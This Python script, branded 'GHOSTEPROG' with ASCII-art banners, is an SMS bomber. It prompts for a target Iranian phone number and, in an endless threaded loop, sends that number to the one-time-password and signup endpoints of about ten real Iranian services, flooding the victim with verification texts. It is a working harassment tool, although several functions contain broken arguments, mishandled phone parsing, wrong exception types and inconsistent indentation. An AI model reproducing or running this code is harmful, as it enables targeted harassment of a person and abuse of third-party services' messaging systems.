import time

print("""
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡀⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠄⠄⠄⠁⠄⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄
⠄⠄⠄⠄⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆⠄⠄⠄
⠄⠄⠄⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮⡀⠄⠄
⠄⠄⠄⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵⠂⠄⠄
⠄⠄⠄⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗⡅⠄⠄
⠄⠄⠄⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎⠆⠄⠄
⠄⠄⠠⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮⠅⠄⠄
⠄⠄⠠⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗⠍⠄⠄
⠄⠄⢀⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿⢀⠄⠄
⠄⠄⠄⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕⠄⠄⠄
⠄⠄⠄⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌⠂⠄⠄
⠄⠄⠄⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪⠄⠄⠄
⠄⠄⠄⠄⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄⠄⠄⠄
⠄⠄⠄⠄⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡⡁⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁⠁⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄""")

print()
print("""
░█▀▀█ ░█─░█ ░█▀▀▀█ ░█▀▀▀█ ▀▀█▀▀ ░█▀▀▀ ░█▀▀█ ░█▀▀█ ░█▀▀▀█ ░█▀▀█ 
░█─▄▄ ░█▀▀█ ░█──░█ ─▀▀▀▄▄ ─░█── ░█▀▀▀ ░█▄▄█ ░█▄▄▀ ░█──░█ ░█─▄▄ 
░█▄▄█ ░█─░█ ░█▄▄▄█ ░█▄▄▄█ ─░█── ░█▄▄▄ ░█─── ░█─░█ ░█▄▄▄█ ░█▄▄█""")
print()
try:
    import requests
except ImportError:
    print('Requests.py is not installed! Install it via "pip install requests" in the terminal'
          '\nthe script will automatically close in 5 seconds')
    time.sleep(5)
    raise SystemExit

try:
    import colorama
except ImportError:
    print('Colorama is not installed! Install it via "pip install colorama" in the terminal'
          '\nthe script will automatically close in 5 seconds')
    time.sleep(5)
    raise SystemExit

from colorama import Fore, Style
from threading import Thread


count_sms_send = 0


def snap(phone):
    # snap api
    snap_phone = {"cellphone": phone}
    try:
        snap_request = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json=snap_phone)
        if "OK" in snap_request.text:
            print(f"{Fore.GREEN }send sms :D")
        else:
            print(f"{Fore.RED}Error! (-_-)")
    except SyntaxError:
        print(f"{Fore.RED}Error! (-_-)")

def gap(phone):
    # gap api
    try:
        gap_request = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]))
        if "OK" in gap_request.text:
            print(f"{Fore.GREEN }send sms :D")
        else:
            print(f"{Fore.RED}Error! (-_-)")
    except SyntaxError:
        print(f"{Fore.RED}Error! (-_-)")


def tap30(phone):
    # tap30 api
    tap30_phone = {"credential": {"phoneNumber": "0"+phone.split("+98")[1], "role": "PASSENGER"}}
    try:
        tap30_request = requests.post("https://tap33.me/api/v2/user", json=tap30_phone)
        if "OK" in tap30_request.text:
            print(f"{Fore.GREEN }send sms :D")
        else:
            print(f"{Fore.RED}Error! (-_-)")
    except SyntaxError:
        print(f"{Fore.RED}Error! (-_-)")


def zarin_plus(phone):
    # zarin plus api

    zarin_phone = {"phone_number": phone.split('+')}
    try:
        zarin_request = requests.post("https://api.zarinplus.com/user/zarinpal-login", data=zarin_phone)
        if "OTP successfully sent to user" in zarin_request.text:
            print(f"{Fore.GREEN }send sms :D")
        else:
            print(f"{Fore.RED}Error! (-_-)")
    except SyntaxError:
        print(f"{Fore.RED}Error! (-_-)")
def divar(phone):
    divar = {"phone_number": phone.split('+')}
    try:
        divar_request = requests.post("https://api.divar.ir/v5/auth/authenticate", data=divar)
        if "OTP successfully sent to user" in divar_request.text:
            print(f"{Fore.GREEN }send sms :D")
        else:
            print(f"{Fore.RED}Error! (-_-)")
    except SyntaxError:
        print(f"{Fore.RED}Error! (-_-)")

def anten(phone):
    anten = {"phone_number": phone.split('+')}
    try:
        anten_request = requests.post("https://api2.anten.ir/users/", anten=divar)
        if "OTP successfully sent to user" in anten_request.text:
            print(f"{Fore.GREEN }send sms :D")
        else:
            print(f"{Fore.RED}Error! (-_-)")
    except SyntaxError:
        print(f"{Fore.RED}Error! (-_-)")

def tebinja(phone):
    tebinja = {"phone_number": phone.split('+')}
    try:
        tebinja_request = requests.post("https://www.tebinja.com/api/v1/users", tebinja=divar)
        if "OTP successfully sent to user" in tebinja_request.text:
            print(f"{Fore.GREEN }send sms :D")
        else:
            print(f"{Fore.RED}Error! (-_-)")
    except SyntaxError:
        print(f"{Fore.RED}Error! (-_-)")
def famiran(phone):
    famiran = {"phone_number": phone.split('+')}
    try:
        famiran_request = requests.post("https://api.famiran.com/api/user/signup", famiran=divar)
        if "OTP successfully sent to user" in famiran_request.text:
            print(f"{Fore.GREEN }send sms :D")
        else:
            print(f"{Fore.RED}Error! (-_-)")
    except SyntaxError:
        print(f"{Fore.RED}Error! (-_-)")

def wall(phone):
    # wall api
    wall_phone = {"phone": phone.split("+98")[1]}
    try:
        wall_request = requests.post("https://api.divar.ir/v5/auth/authenticate", json=wall_phone)
        if "SENT" in wall_request.text:
            print(f"{Fore.GREEN }send sms :D")
        else:
            print(f"{Fore.RED}Error! (-_-)")
    except SyntaxError:
        print(f"{Fore.RED}Error! (-_-)")


def torob(phone):
    # torob api
    try:
        torob_request = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1])
        if "sent" in torob_request.text:
            print(f"{Fore.GREEN }send sms :D")
        else:
            print(f"{Fore.RED}Error! (-_-)")
    except SyntaxError:
        print(f"{Fore.RED}Error! (-_-)")


def main():
    # poor booting animation:
    print(f"{Style.BRIGHT}loading of{Fore.RED} GHOSTEPROG {Fore.RESET}Bot")
    time.sleep(0.3)
    print(f"{Fore.RED}25%")
    time.sleep(0.5)
    print(f"{Fore.YELLOW}50%")
    time.sleep(0.6)
    print(f"{Fore.LIGHTYELLOW_EX}75%")
    time.sleep(0.7)
    print(f"{Fore.LIGHTGREEN_EX}99%")
    time.sleep(1)
    print(f"{Fore.LIGHTBLUE_EX}Storm is online")
    time.sleep(1)
    phone = '+98' + str(input(f"{Fore.GREEN }Target Phone : +98 "))
    while True:
       Thread(target=snap, args=[phone]).start()
        time.sleep(2)
        Thread(target=gap, args=[phone]).start()
        time.sleep(2)
        Thread(target=tap30, args=[phone]).start()
        time.sleep(2)
        Thread(target=zarin_plus, args=[phone]).start()
        time.sleep(2)
        Thread(target=divar, args=[phone]).start()
        time.sleep(2)
        Thread(target=wall, args=[phone]).start()
        time.sleep(2)
        Thread(target=anten, args=[phone]).start()
        time.sleep(2)
        Thread(target=tebinja, args=[phone]).start()
        time.sleep(2)
        Thread(target=famiran, args=[phone]).start()
        time.sleep(2)
        Thread(target=torob, args=[phone]).start()
        print('----------------------')
        time.sleep(5)

        
if __name__ == "__main__":
    main()
